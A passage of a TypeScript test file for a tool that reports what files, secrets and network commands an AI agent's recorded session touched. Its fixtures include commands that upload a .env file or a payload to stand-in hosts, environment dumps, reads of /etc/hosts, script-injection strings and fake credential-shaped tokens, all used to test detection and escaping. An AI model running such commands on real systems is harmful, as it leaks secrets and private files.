// Card 605: the HTML of the files report (design section 5, the mockup's
// layout). The cases pin the section order, the source words, escaping, the
// verdict of a project-only session, the print and design switch, and the
// controller's rulings on cut commands, secret files, fallback destinations,
// the counts note and reached models.

import { describe, expect, it } from "vitest";
import type { RunEvent } from "../events";
import { clockText } from "./axis";
import { foldFiles, type FileLedger } from "./fold";
import { mergeModel } from "./modelReading";
import { buildReport, type FilesReport } from "./report";
import { reportCsv } from "./reportCsv";
import { reportFilename, reportHtml, verdictLine } from "./reportHtml";

const T0 = 1_760_000_000_000;
const W = "/w";

// Vectors joined at run time, so no credential-shaped literal sits in this file.
const AKID = ["AK", "IA", "Z7Q3M2X9", "K4W8P1N6"].join("");
const DOC_KEY = ["AK", "IA", "IOSFODNN7", "EXAM", "PLE"].join("");
const PAT = ["gh", "p_", "Zq4Lm8Rt2Vx6Bn0Ck3Hs7Jd1Wf5Gy9Pa2Ue6"].join("");
const SLACK = ["xo", "xb-", "1234567890-", "AbCdEfGhIj"].join("");
const GOOGLE = ["AI", "za", "Sy", "B1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R"].join("");
const DB_PW = ["Hx7p", "Lq2vZw"].join("");

/** A session written event by event, one second apart, so `t` is the index. */
class Rec {
  readonly events: RunEvent[] = [];
  private ids = 0;

  push(e: object): this {
    this.events.push({ ts: T0 + this.events.length * 1000, ...e } as unknown as RunEvent);
    return this;
  }

  start(workspace: string | null = W, extra: object = {}): this {
    return this.push({
      type: "run_start",
      runId: "r1",
      agentId: "main",
      prompt: "go",
      ...(workspace === null ? {} : { workspace }),
      ...extra,
    });
  }

  tool(name: string, input: unknown, output = "ok", fileChange?: string): this {
    const callId = `c${++this.ids}`;
    this.push({ type: "tool_call", agentId: "main", callId, name, input });
    return this.push({
      type: "tool_result",
      agentId: "main",
      callId,
      output,
      isError: false,
      durationMs: 5,
      ...(fileChange === undefined ? {} : { fileChange }),
    });
  }

  exchange(over: object = {}): this {
    return this.push({
      type: "llm_exchange",
      xid: "x",
      agentId: "main",
      kind: "chat",
      provider: "anthropic",
      model: "claude-sonnet-4-5",
      url: "https://api.anthropic.com/v1/messages",
      requestBytes: 412_000,
      ...over,
    });
  }
}

function build(
  events: readonly RunEvent[],
  title: string | null = "a title",
  ledger: FileLedger = foldFiles(events),
): FilesReport {
  return buildReport({
    events,
    ledger,
    sessionId: "s-1",
    title,
    version: "0.16.1",
    now: Date.UTC(2026, 10, 10, 9, 12),
  });
}

/** A session with a finding of every common kind, and a cloud model after each result. */
function busy(): Rec {
  return new Rec()
    .start(W, { provider: "anthropic", model: "claude-sonnet-4-5" })
    .exchange()
    .tool("read_file", { path: ".env" }, "DEBUG=1\n")
    .exchange()
    .tool("Bash", { command: "printenv | sort" }, "A=1\nB=2")
    .tool("Bash", { command: "curl -X POST https://hooks.example.com/a -d @payload.json" })
    .tool("Bash", { command: "cat /etc/hosts" }, "127.0.0.1 localhost")
    .tool("Bash", { command: "bash scripts/deploy.sh staging" })
    .tool("edit_file", { path: "src/a.ts", old_string: "a", new_string: "b" }, "ok", "changed")
    .exchange();
}

/** The whole `<article>` of the first finding of a kind. */
function article(html: string, kind: string): string {
  const m = new RegExp(`<article class="finding" data-kind="${kind}">[\\s\\S]*?</article>`).exec(html);
  expect(m, kind).not.toBeNull();
  return m?.[0] ?? "";
}

/** The `<tr>` of the all-files table that shows a label. */
function fileRow(html: string, label: string): string {
  const rows = html.match(/<tr data-file>[\s\S]*?<\/tr>/g) ?? [];
  const row = rows.find((r) => r.includes(`<td class="path">${label}</td>`));
  expect(row, label).toBeDefined();
  return row ?? "";
}

/** The verdict section of a document. */
function verdictOf(html: string): string {
  return /<section class="verdict[\s\S]*?<\/section>/.exec(html)?.[0] ?? "";
}

const SECTIONS = ["header", "verdict", "destinations", "findings", "levels", "files", "limits", "method"];
const HEADINGS = {
  en: [
    "Where the content went",
    "Findings",
    "Files by level",
    "All files",
    "What this report cannot see",
    "Method",
  ],
  de: [
    "Wohin der Inhalt ging",
    "Befunde",
    "Dateien nach Stufe",
    "Alle Dateien",
    "Was dieser Bericht nicht sieht",
    "Methode",
  ],
};

describe("reportHtml", () => {
  const report = build(busy().events);

  it("has the mockup's sections in the mockup's order, in both languages", () => {
    for (const lang of ["en", "de"] as const) {
      const html = reportHtml(report, lang);
      expect(html.startsWith("<!doctype html>")).toBe(true);
      expect(html).toContain(`<html lang="${lang}" data-design="light">`);
      const at = SECTIONS.map((s) => html.indexOf(`data-section="${s}"`));
      expect(
        at.every((i) => i > 0),
        lang,
      ).toBe(true);
      expect(at, lang).toEqual([...at].sort((a, b) => a - b));
      const headings = [...html.matchAll(/<h2>([^<]*)<\/h2>/g)].map((m) => m[1]);
      expect(headings, lang).toEqual(HEADINGS[lang]);
    }
  });

  it("prints a probable source as probable, never as recorded", () => {
    const en = reportHtml(report, "en");
    const outside = article(en, "outside");
    expect(outside).toContain('<span class="src src-probable">probable</span>');
    expect(outside).not.toContain("recorded");
    const row = fileRow(en, "/etc/hosts");
    expect(row).toContain(">probable<");
    expect(row).not.toContain("recorded");

    const de = reportHtml(report, "de");
    expect(article(de, "outside")).toContain(">wahrscheinlich<");
    expect(article(de, "outside")).not.toContain("aufgezeichnet");

    // A secret file the tool reported is recorded.
    expect(article(en, "secret-file")).toContain('<span class="src">recorded</span>');
  });

  it("prints a model entry as model, never as recorded", () => {
    const rec = new Rec().start().tool("Bash", { command: "echo hi" });
    const ledger = mergeModel(foldFiles(rec.events), [
      { callIndex: 1, path: "notes.txt", kind: "read", reason: "the model says so" },
    ]);
    const html = reportHtml(build(rec.events, "t", ledger), "en");
    const row = fileRow(html, "notes.txt");
    expect(row).toContain('<span class="src src-model">model</span>');
    expect(row).not.toContain("recorded");
    expect(row).not.toContain("probable");
  });

  it("escapes a title that holds markup", () => {
    const html = reportHtml(build(busy().events, '<script>alert("x")</script>'), "en");
    expect(html).toContain("<h1>&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;</h1>");
    expect(html).toContain("<title>files report · &lt;script&gt;");
    expect(html.match(/<script/g)).toHaveLength(1);
  });

  it("a project-only report names the shapes it checked and never says safe", () => {
    const rec = new Rec()
      .start()
      .tool("edit_file", { path: "src/a.ts", old_string: "a", new_string: "b" }, "ok", "changed")
      .tool("read_file", { path: "README.md" });
    const project = build(rec.events);
    expect(project.verdict).toBe("project");
    expect(project.findings).toEqual([]);

    const en = reportHtml(project, "en");
    expect(en).toContain(
      "This report checked for secret files by name, credentials by shape, environment and keychain dumps, " +
        "network commands, files outside the project, personal data and scripts with unknown effect, " +
        "and found none of these.",
    );
    expect(en).not.toMatch(/\bsafe\b/i);
    expect(en).toContain('<p class="none">No finding.</p>');

    const de = reportHtml(project, "de");
    expect(de).toContain(
      "Dieser Bericht hat geheime Dateien nach Namen, Zugangsdaten nach Form, Ausgaben der Umgebung und " +
        "des Schlüsselbunds, Netzwerkbefehle, Dateien außerhalb des Projekts, personenbezogene Daten " +
        "und Skripte mit unbekannter Wirkung geprüft und nichts davon gefunden.",
    );
    expect(de).not.toMatch(/\bsicher\b/i);

    // A critical report does not say it either.
    expect(reportHtml(report, "en")).not.toMatch(/\bsafe\b/i);
    expect(reportHtml(report, "de")).not.toMatch(/\bsicher\b/i);
  });

  it("a model's reading in a project-only report is named, not counted", () => {
    const rec = new Rec().start().tool("Bash", { command: "echo hi" });
    const ledger = mergeModel(foldFiles(rec.events), [
      { callIndex: 1, path: ".env", kind: "read", reason: "the model says so" },
    ]);
    const project = build(rec.events, "t", ledger);
    expect(project.verdict).toBe("project");
    const html = reportHtml(project, "en");
    // Apostrophes print escaped, as every inserted string does.
    expect(html).toContain(
      "A model&#39;s reading names 1 more finding; it is marked model and does not count.",
    );
    expect(html).toContain(
      "Files only a model&#39;s reading names are left out: model readings not counted (1).",
    );
  });

  it("carries the print stylesheet and the design switch", () => {
    const html = reportHtml(report, "en");
    expect(html).toMatch(/@media print\{\s*:root,:root\[data-design\]\{/);
    expect(html).toContain(':root[data-design="light"]{');
    expect(html).toContain('<button type="button" id="design-switch" hidden>light / dark</button>');
    expect(reportHtml(report, "de")).toContain(
      '<button type="button" id="design-switch" hidden>hell / dunkel</button>',
    );
    expect(html).toMatch(/\.bar\{display:none\}/);
  });

  it("the switch toggles light and dark", () => {
    const script = /<script>([\s\S]*?)<\/script>/.exec(reportHtml(report, "en"))?.[1] ?? "";
    let click: () => void = () => {};
    const button = {
      hidden: true,
      addEventListener: (type: string, fn: () => void) => {
        if (type === "click") click = fn;
      },
    };
    const root = { dataset: { design: "light" } };
    const doc = {
      documentElement: root,
      getElementById: (id: string) => (id === "design-switch" ? button : null),
    };
    new Function("document", script)(doc);
    expect(button.hidden).toBe(false);
    click();
    expect(root.dataset.design).toBe("dark");
    click();
    expect(root.dataset.design).toBe("light");
  });

  it("makes no request: no link, no source, no URL outside a printed command", () => {
    for (const lang of ["en", "de"] as const) {
      const html = reportHtml(report, lang);
      expect(html).not.toMatch(/\b(?:src|href|srcset|action)\s*=/i);
      expect(html).not.toMatch(/url\(|@import|<link|<img|<iframe|<object|<embed/i);
      const script = /<script>([\s\S]*?)<\/script>/.exec(html)?.[1] ?? "";
      expect(script).not.toMatch(/https?:|fetch|XMLHttpRequest|import/);
      // The command of the network finding prints its URL as text; nothing else does.
      expect(html).toContain("https://hooks.example.com/a");
      const outsideCommands = html.replace(/<pre class="cmd">[\s\S]*?<\/pre>/g, "");
      expect(outsideCommands).not.toMatch(/https?:\/\//);
      // The destination host prints as text.
      expect(html).toContain('<td class="path">api.anthropic.com</td>');
    }
  });

  it("prints times with the files tab's clock and the event index", () => {
    const en = reportHtml(report, "en");
    const secret = article(en, "secret-file");
    expect(secret).toContain(`+${clockText("en", 2)} · event 2 · main`);
    expect(en).not.toMatch(/· call \d/);
    const de = reportHtml(report, "de");
    expect(article(de, "secret-file")).toContain(`+${clockText("de", 2)} · Ereignis 2 · main`);
    expect(en).toContain("the app's links use the same number");
  });

  it("a prompt or steering finding prints the event it was seen at", () => {
    const rec = new Rec()
      .start()
      .push({ type: "user_message", text: `use ${PAT}` })
      .push({ type: "steering_message", agentId: "main", text: `and ${SLACK}`, taken: true, turn: 1 });
    const prompts = build(rec.events);
    const html = reportHtml(prompts, "en");
    const found =
      html.match(/<article class="finding" data-kind="credential-prompt">[\s\S]*?<\/article>/g) ?? [];
    expect(found).toHaveLength(2);
    expect(found[0]).toContain(`+${clockText("en", 1)} · event 1 · person`);
    expect(found[1]).toContain(`+${clockText("en", 2)} · event 2 · main`);
  });

  it("names the models a finding's content reached", () => {
    const html = reportHtml(report, "en");
    expect(article(html, "secret-file")).toContain(
      "The content went to <code>claude-sonnet-4-5</code> (cloud).",
    );
    expect(article(reportHtml(report, "de"), "secret-file")).toContain(
      "Der Inhalt ging an <code>claude-sonnet-4-5</code> (Cloud).",
    );
  });

  it("says what happened to a secret file", () => {
    const rec = new Rec()
      .start()
      .tool("read_file", { path: ".env" }, "DEBUG=1\n")
      .tool("write_file", { path: "keys/server.pem", content: "x" }, "ok", "created")
      .tool("edit_file", { path: ".npmrc", old_string: "a", new_string: "b" }, "ok", "changed")
      .tool("Bash", { command: "rm .netrc" });
    const html = reportHtml(build(rec.events), "en");
    const titles = [
      ...html.matchAll(/<article class="finding" data-kind="secret-file">[\s\S]*?<b>([^<]*)<\/b>/g),
    ];
    expect(titles.map((m) => m[1])).toEqual([
      "Secret file read",
      "Secret file created",
      "Secret file changed",
      "Secret file deleted",
    ]);
    const de = reportHtml(build(rec.events), "de");
    const deTitles = [
      ...de.matchAll(/<article class="finding" data-kind="secret-file">[\s\S]*?<b>([^<]*)<\/b>/g),
    ];
    expect(deTitles.map((m) => m[1])).toEqual([
      "Geheime Datei gelesen",
      "Geheime Datei erstellt",
      "Geheime Datei geändert",
      "Geheime Datei gelöscht",
    ]);
  });

  it("prints a cut command with the count of what was cut", () => {
    const rec = new Rec().start().tool("Bash", { command: "cat > .env <<'EOF'\nA=1\nEOF" });
    const cut = build(rec.events);
    const n = cut.findings[0].commandCut;
    expect(n).toBeGreaterThan(0);
    expect(reportHtml(cut, "en")).toContain(
      `<pre class="cmd">cat &gt; .env <span class="cut">(${n} more characters)</span></pre>`,
    );
    expect(reportHtml(cut, "de")).toContain(
      `<pre class="cmd">cat &gt; .env <span class="cut">(${n} weitere Zeichen)</span></pre>`,
    );
  });

  it("a long command wraps in its block", () => {
    const rec = new Rec().start().tool("Bash", { command: `cat .env && echo ${"word ".repeat(80)}` });
    const html = reportHtml(build(rec.events), "en");
    expect(html).toMatch(/pre\.cmd\{[^}]*white-space:pre-wrap/);
    expect(html).toMatch(/pre\.cmd\{[^}]*overflow-wrap:anywhere/);
  });

  it("prints a run_start fallback without request counts", () => {
    const local = build(new Rec().start(W, { provider: "ollama", model: "qwen2.5:7b" }).events);
    expect(local.destinations).toMatchObject([{ provider: "ollama", recorded: false, where: "unknown" }]);
    const en = reportHtml(local, "en");
    const row = /<tr data-destination>[\s\S]*?<\/tr>/.exec(en)?.[0] ?? "";
    expect(row).toContain("a local server, address not recorded");
    expect(row).toContain("<td>address not recorded</td>");
    expect(row).toContain('<td class="num"></td><td class="num"></td>');
    const de = reportHtml(local, "de");
    expect(de).toContain("ein lokaler Server, Adresse nicht aufgezeichnet");

    const cloud = build(new Rec().start(W, { provider: "anthropic", model: "claude-sonnet-4-5" }).events);
    const cloudRow = /<tr data-destination>[\s\S]*?<\/tr>/.exec(reportHtml(cloud, "en"))?.[0] ?? "";
    expect(cloudRow).toContain("<td>address not recorded</td>");
    expect(cloudRow).toContain("outside this machine");
    expect(cloudRow).toContain('<td class="num"></td><td class="num"></td>');

    const none = build(new Rec().start(W).events);
    expect(reportHtml(none, "en")).toContain("No exchange with a model was recorded.");
  });

  it("prints a relayed model as relayed to a cloud model", () => {
    const rec = new Rec()
      .start()
      .exchange({ provider: "ollama", model: "glm-5.3:cloud", url: "http://localhost:11434/api/chat" })
      .exchange({ provider: "ollama", model: "qwen2.5:7b", url: "http://localhost:11434/api/chat" })
      .exchange({ provider: "lmstudio", model: "m", url: "http://192.168.1.20:1234/v1" });
    const html = reportHtml(build(rec.events), "en");
    const rows = html.match(/<tr data-destination>[\s\S]*?<\/tr>/g) ?? [];
    expect(rows).toHaveLength(3);
    expect(rows[0]).toContain("relayed to a cloud model");
    expect(rows[0]).toContain('<td class="num">1</td>');
    expect(rows[1]).toContain("this machine");
    expect(rows[2]).toContain("another machine on the local network");
    expect(rows[2]).toContain('<td class="path">192.168.1.20</td>');
    expect(reportHtml(build(rec.events), "de")).toContain("an ein Cloud-Modell weitergeleitet");
  });

  it("says model readings are not counted only when such rows exist", () => {
    expect(reportHtml(report, "en")).not.toContain("model readings not counted");
    expect(reportHtml(report, "de")).not.toContain("Lesarten eines Modells nicht gezählt");
  });

  it("counts the files by level", () => {
    const html = reportHtml(report, "en");
    const table = /<table class="matrix">[\s\S]*?<\/table>/.exec(html)?.[0] ?? "";
    const critical = /<tr><td><span class="lv lv-critical">critical<\/span><\/td>([\s\S]*?)<\/tr>/.exec(
      table,
    );
    expect(critical?.[1]).toBe("<td>1</td><td>0</td><td>0</td><td>0</td>");
    const project = /<tr><td><span class="lv lv-project">project<\/span><\/td>([\s\S]*?)<\/tr>/.exec(table);
    expect(project?.[1]).toBe(
      `<td>${report.counts.project.read}</td><td>${report.counts.project.changed}</td>` +
        `<td>${report.counts.project.created}</td><td>${report.counts.project.deleted}</td>`,
    );
  });

  it("folds a long tail of project files that were only read", () => {
    const rec = new Rec().start().tool("read_file", { path: ".env" }, "DEBUG=1\n");
    for (let i = 0; i < 40; i++) rec.tool("read_file", { path: `docs/d${i}.md` });
    const many = build(rec.events);
    const html = reportHtml(many, "en");
    expect(html.match(/<tr data-file>/g)).toHaveLength(26);
    expect(html).toContain("15 more project files, all only read. The CSV lists every file.");
    expect(reportHtml(many, "de")).toContain(
      "15 weitere Projektdateien, alle nur gelesen. Die CSV-Datei führt jede Datei auf.",
    );
  });

  it("writes no dash the house style forbids", () => {
    for (const lang of ["en", "de"] as const) {
      expect(reportHtml(report, lang)).not.toMatch(/[\u2013\u2014]/);
    }
  });

  it("a network command to this machine is not called absent (task 11 item 3a)", () => {
    const one = build(
      new Rec().start().tool("Bash", { command: "curl -s http://localhost:8080/api/health" }).events,
    );
    expect(one.verdict).toBe("project");
    expect(one.findings.map((f) => f.kind)).toEqual(["network"]);
    expect(verdictLine(one, "en")).toBe(
      "The recording holds no file the session touched. This report checked for secret files by name, " +
        "credentials by shape, environment and keychain dumps, files outside the project, personal data and " +
        "scripts with unknown effect, and found none of these.",
    );
    const en = reportHtml(one, "en");
    expect(en).toContain("The network command ran only against this machine.");
    expect(en).not.toContain("network commands, files outside");
    const de = reportHtml(one, "de");
    expect(de).toContain("Der Netzwerkbefehl richtete sich nur an diesen Rechner.");
    expect(de).not.toContain("Netzwerkbefehle, Dateien");
    const two = build(
      new Rec()
        .start(null)
        .tool("Bash", { command: "curl -s http://localhost:8080/a" })
        .tool("Bash", { command: "curl http://127.0.0.1:5173/" }).events,
    );
    expect(reportHtml(two, "en")).toContain("The 2 network commands ran only against this machine.");
    expect(reportHtml(two, "de")).toContain("Die 2 Netzwerkbefehle richteten sich nur an diesen Rechner.");
    expect(verdictLine(two, "en")).not.toContain("network commands");
  });

  it("the method says what an unnamed position value prints as (task 11 item 10)", () => {
    const report = build(new Rec().start().tool("read_file", { path: "README.md" }).events);
    const en = reportHtml(report, "en");
    expect(en).toContain(
      "otherwise it is not counted and prints as <code>[value]</code>, or as written when it is a variable or a placeholder.",
    );
    expect(en).not.toContain("otherwise they print as");
    const de = reportHtml(report, "de");
    expect(de).toContain(
      "sonst zählt er nicht und steht als <code>[value]</code> im Befehl, " +
        "eine Variable oder ein Platzhalter so, wie sie geschrieben wurden.",
    );
  });

  it("the method states the option, header and getter rules of task 11 item 3", () => {
    const report = build(new Rec().start().tool("read_file", { path: "README.md" }).events);
    const en = reportHtml(report, "en");
    for (const part of [
      "The options <code>--key</code>, <code>--key-type</code>, <code>--pubkey</code> and <code>--pinnedpubkey</code> are left out, because their values are paths or types.",
      "For <code>aws configure get</code>, that holds only for an access key, a secret key or a session token. " +
        "In each case the command must have printed the value itself, not into a pipe or a substitution.",
    ])
      expect(en, part).toContain(part);
    const de = reportHtml(report, "de");
    for (const part of [
      "Die Optionen <code>--key</code>, <code>--key-type</code>, <code>--pubkey</code> und <code>--pinnedpubkey</code> zählen nicht, weil ihre Werte Pfade oder Typen sind.",
      "Bei <code>aws configure get</code> gilt das nur für einen Zugriffsschlüssel, einen geheimen Schlüssel oder ein " +
        "Sitzungstoken. In jedem Fall muss der Befehl den Wert selbst ausgegeben haben, nicht in eine Pipe oder eine Befehlsersetzung.",
    ])
      expect(de, part).toContain(part);
  });

  it("the method states the word rule for names and the colon rule for users (task 11 item 11, fix round 2 item 4)", () => {
    const report = build(new Rec().start().tool("read_file", { path: "README.md" }).events);
    const en = reportHtml(report, "en");
    for (const part of [
      "They also include the value of the Cookie header, and of an option, a header or a query parameter when a word of its name says credential.",
      "Those words are key, token, secret, pass, password, passwd, passphrase, pwd, auth, authorization, sig, " +
        "signature, session, sid, code, credential and bearer. Key counts only alone or beside api, access, secret, " +
        "private, auth, client, master, signing or encryption, and code only alone or beside auth, authorization, " +
        "otp, verification, access, refresh, device or oauth.",
      "Joined forms such as <code>apikey</code>, and curl's <code>--tlspassword</code> and " +
        "<code>--proxy-tlspassword</code>, count too.",
      "These places are a URL's password and the password of <code>sshpass -p</code>.",
      "A user name given alone, and a query value whose name says nothing of a credential, do not count by their place.",
      // Fix round 2 item 5 (M1).
      "In <code>-u</code>, <code>--user</code> and the other user options it is the password after the colon, " +
        "or the user when that password is empty.",
    ])
      expect(en, part).toContain(part);
    expect(en).not.toContain("their name holds");
    const de = reportHtml(report, "de");
    for (const part of [
      "Dazu kommen der Wert des Headers Cookie und der Wert einer Option, eines Headers oder eines " +
        "Abfrageparameters, wenn ein Wort seines Namens Zugangsdaten nennt.",
      "Diese Wörter sind key, token, secret, pass, password, passwd, passphrase, pwd, auth, authorization, sig, " +
        "signature, session, sid, code, credential und bearer. Key zählt nur allein oder neben api, access, secret, " +
        "private, auth, client, master, signing oder encryption, code nur allein oder neben auth, authorization, " +
        "otp, verification, access, refresh, device oder oauth.",
      "dazu curls <code>--tlspassword</code> und <code>--proxy-tlspassword</code>.",
      "Ein Benutzername allein und ein Wert einer Abfrage, deren Name nichts von Zugangsdaten sagt, zählen nicht durch ihre Stelle.",
      "Bei <code>-u</code>, <code>--user</code> und den anderen Benutzeroptionen ist es das Passwort nach dem " +
        "Doppelpunkt, oder der Benutzer, wenn dieses Passwort leer ist.",
    ])
      expect(de, part).toContain(part);
  });

  it("the method says a password is masked into the next word after a name that ends in its sign (task 11 item 1)", () => {
    const report = build(new Rec().start().tool("read_file", { path: "README.md" }).events);
    expect(reportHtml(report, "en")).toContain(
      "In a command, a password assignment is masked to the end of its word, or to the end of the next word " +
        "when its word ends in = or :. A URL's user and password are masked from :// to the last @.",
    );
    expect(reportHtml(report, "de")).toContain(
      "In einem Befehl wird eine Passwortzuweisung bis zum Ende ihres Worts geschwärzt, und wenn ihr Wort auf " +
        "= oder : endet, bis zum Ende des nächsten Worts. Benutzer und Passwort einer URL werden von :// bis zum " +
        "letzten @ geschwärzt.",
    );
  });

  it("prints the display net's marker in the reader's language and names what it hides (fix round 2 item 1)", () => {
    // A JSON body: no rule counts the value, the net hides it.
    const v = ["Ab", ",Cd2", "Ef3xQz"].join("");
    const command = `curl -d '{"password":"${v}","opts":{"remember":true}}' https://api.acme.io/login`;
    const report = build(new Rec().start(W).tool("Bash", { command }).events);
    const en = reportHtml(report, "en");
    expect(en).toContain('<span class="masked">[hidden]</span>');
    expect(en).toContain(
      "Printed commands and titles also hide every word that mixes letters and digits, or upper case, lower case " +
        "and symbols, unless it is a path, an address, an option, a program or a version.",
    );
    const de = reportHtml(report, "de");
    expect(de).toContain('<span class="masked">[verdeckt]</span>');
    expect(de).not.toContain("[hidden]");
    expect(de).toContain(
      "Ausgegebene Befehle und Titel verdecken zusätzlich jedes Wort, das Buchstaben und Ziffern mischt oder " +
        "Groß- und Kleinbuchstaben und Sonderzeichen, außer Pfaden, Adressen, Optionen, Programmen und Versionen.",
    );
    expect(reportCsv(report, "de")).toContain("[verdeckt]");
    expect(reportCsv(report, "en")).toContain("[hidden]");
    // The title, in the head and in the heading.
    const titled = build(new Rec().start(W).events, `Use ${["Ab1", "Cd2Ef3"].join("")} for db`);
    for (const [lang, marker] of [
      ["en", "[hidden]"],
      ["de", "[verdeckt]"],
    ] as const) {
      const html = reportHtml(titled, lang);
      expect(html, lang).toContain(`<h1>Use <span class="masked">${marker}</span> for db</h1>`);
      expect(html, lang).toContain(`· Use ${marker} for db</title>`);
    }
  });

  it("says when the workspace was not recorded", () => {
    const rec = new Rec().start(null).tool("read_file", { path: "/etc/hosts" });
    const html = reportHtml(build(rec.events), "en");
    expect(html).toContain("<dt>workspace</dt><dd>not recorded");
  });

  it("a project-only report without a workspace says so and claims no outside check", () => {
    const rec = new Rec().start(null).tool("read_file", { path: "README.md" });
    const project = build(rec.events);
    expect(project.verdict).toBe("project");
    expect(project.workspace).toBeNull();

    const en = verdictOf(reportHtml(project, "en"));
    expect(en).toContain("<b>The workspace was not recorded.</b>");
    expect(en).toContain(
      "This report checked for secret files by name, credentials by shape, environment and keychain dumps, " +
        "network commands, files in system folders and dot folders of a home folder, personal data and " +
        "scripts with unknown effect, and found none of these.",
    );
    expect(en).toContain("Without a workspace it cannot tell which other files belong to the project.");
    expect(en).not.toContain("outside the project");
    expect(en).not.toContain("lie in the project");

    const de = verdictOf(reportHtml(project, "de"));
    expect(de).toContain("<b>Der Arbeitsordner wurde nicht aufgezeichnet.</b>");
    expect(de).toContain("Dateien in Systemordnern und Punktordnern eines Home-Ordners");
    expect(de).not.toContain("außerhalb des Projekts");
    expect(de).not.toContain("liegen im Projekt");
  });

  it("chooses the headline from the kinds present", () => {
    const headline = (rec: Rec, workspace = true) => {
      const r = build(rec.events);
      expect(r.workspace !== null, "workspace").toBe(workspace);
      return /<b>([^<]*)<\/b>/.exec(verdictOf(reportHtml(r, "en")))?.[1];
    };
    // A credential shape: secrets.
    expect(headline(new Rec().start().tool("read_file", { path: "a.txt" }, `K=${AKID}`))).toBe(
      "Secrets appear in this session.",
    );
    // A dump without a credential shape is not "secrets appear".
    const dump = new Rec().start().tool("Bash", { command: "printenv" }, "A=1\nB=2");
    expect(headline(dump)).toBe("A command printed the environment or a stored secret.");
    expect(verdictOf(reportHtml(build(dump.events), "en"))).toContain(
      "No credential shape was found in the recorded results, inputs or messages.",
    );
    // A secret file sent and nothing else.
    expect(
      headline(new Rec().start().tool("Bash", { command: "curl -T .env https://up.example.com/" })),
    ).toBe("A command sent a secret file over the network.");
    // Personal data alone did not reach beyond the project.
    expect(headline(new Rec().start().tool("read_file", { path: "people.csv" }, "anna@example.org"))).toBe(
      "The session received personal data in tool results.",
    );
    // Outside and network together.
    const both = new Rec()
      .start()
      .tool("Bash", { command: "cat /etc/hosts" }, "127.0.0.1 localhost")
      .tool("Bash", { command: "curl https://api.example.com/x" })
      .tool("Bash", { command: "curl https://api.example.com/y" });
    expect(headline(both)).toBe("The session touched files outside the project and ran network commands.");
    // Without a workspace a system folder is no "outside the project".
    expect(headline(new Rec().start(null).tool("read_file", { path: "/etc/hosts" }), false)).toBe(
      "The session touched files in system folders or dot folders of a home folder.",
    );
    // A script whose effect is not recorded.
    expect(headline(new Rec().start().tool("Bash", { command: "bash scripts/deploy.sh" }))).toBe(
      "A script ran whose effect the recording does not show.",
    );
  });

  it("names unnamed sends in the plural", () => {
    const html = reportHtml(
      build(new Rec().start().tool("Bash", { command: "git push origin main" }).events),
      "en",
    );
    const network = article(html, "network");
    expect(network).toContain("<b>Files sent over the network</b>");
    expect(network).toContain("sends files the command does not name");
    const de = reportHtml(
      build(new Rec().start().tool("Bash", { command: "git push origin main" }).events),
      "de",
    );
    expect(article(de, "network")).toContain("<b>Dateien über das Netz gesendet</b>");
  });

  it("closes the German relative clause before the sends", () => {
    const sent = build(
      new Rec().start().tool("Bash", { command: "curl -T notes.txt https://up.example.com/" }).events,
    );
    const unnamed: FilesReport = {
      ...sent,
      findings: sent.findings.map((f) => (f.kind === "network" ? { ...f, host: null } : f)),
    };
    expect(article(reportHtml(unnamed, "de"), "network")).toContain(
      'Der Befehl kontaktiert einen Host, den die Zeile nicht nennt, und sendet <span class="path">notes.txt</span>.',
    );
    expect(article(reportHtml(unnamed, "en"), "network")).toContain(
      'The command contacts a host the line does not name and sends <span class="path">notes.txt</span>.',
    );
  });

  it("names the placeholder count with its noun", () => {
    const one = build(new Rec().start().tool("read_file", { path: "docs/aws.md" }, `key: ${DOC_KEY}`).events);
    expect(one.placeholders).toBe(1);
    expect(reportHtml(one, "en")).toContain("This session held 1 placeholder.");
    expect(reportHtml(one, "de")).toContain("Diese Session enthielt 1 Platzhalter.");
    const two = build(
      new Rec().start().tool("read_file", { path: "docs/aws.md" }, `a: ${DOC_KEY}\nb: ${DOC_KEY}`).events,
    );
    expect(two.placeholders).toBe(2);
    expect(reportHtml(two, "en")).toContain("This session held 2 placeholders.");
    expect(reportHtml(two, "de")).toContain("Diese Session enthielt 2 Platzhalter.");
  });

  it("an env dump without output says so", () => {
    const rec = new Rec().start();
    rec.push({ type: "tool_call", agentId: "main", callId: "x1", name: "Bash", input: { command: "env" } });
    const html = reportHtml(build(rec.events), "en");
    expect(article(html, "env-dump")).toContain("No output was recorded.");
  });

  it("escapes a hostile path, host, sends and command", () => {
    const hostile = '<img onerror="x">';
    const rec = new Rec()
      .start()
      .tool("read_file", { path: `${hostile}.env` }, "DEBUG=1")
      .tool("Bash", { command: `echo '<script>alert(1)</script>' > out.html && cat .env` })
      .tool("Bash", { command: "curl -d @payload.json https://up.example.com/" });
    const built = build(rec.events);
    const report2: FilesReport = {
      ...built,
      destinations: [{ ...built.destinations[0], host: "<b>host</b>" }],
      findings: built.findings.map((f) =>
        f.kind === "network" ? { ...f, host: "<i>h</i>", sends: ["<u>s</u>"] } : f,
      ),
    };
    for (const lang of ["en", "de"] as const) {
      const html = reportHtml(report2, lang);
      expect(html, lang).not.toContain("<img");
      expect(html, lang).not.toContain("<script>alert");
      expect(html, lang).not.toMatch(/<b>host|<i>h|<u>s/);
      expect(html, lang).toContain("&lt;img onerror=&quot;x&quot;&gt;.env");
      expect(html, lang).toContain("echo &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39; &gt; out.html");
      expect(html, lang).toContain("&lt;b&gt;host&lt;/b&gt;");
      expect(html, lang).toContain("&lt;i&gt;h&lt;/i&gt;");
      expect(html, lang).toContain("&lt;u&gt;s&lt;/u&gt;");
      expect(html.match(/<script/g), lang).toHaveLength(1);
    }
  });

  it("keeps table names whole and lets the table scroll; print breaks them", () => {
    const html = reportHtml(report, "en");
    expect(html).toContain("td code,td.path{overflow-wrap:break-word}");
    expect(html).toMatch(/@media print\{[\s\S]*td code,td\.path\{overflow-wrap:anywhere\}/);
  });
});

describe("the fields the model keeps as recorded are masked", () => {
  // Each field carries its own vector, so each mask is pinned on its own.
  const rec = new Rec().start();
  rec.push({
    type: "tool_call",
    agentId: `helper-${SLACK}`,
    callId: "h1",
    name: "read_file",
    input: { path: ".env" },
  });
  rec.push({
    type: "tool_result",
    agentId: `helper-${SLACK}`,
    callId: "h1",
    output: "DEBUG=1",
    isError: false,
  });
  rec.push({
    type: "tool_call",
    agentId: "main",
    callId: "m1",
    name: `mcp-${GOOGLE}`,
    input: { host: "db", password: DB_PW },
  });
  const events = rec.events;
  const masked = buildReport({
    events,
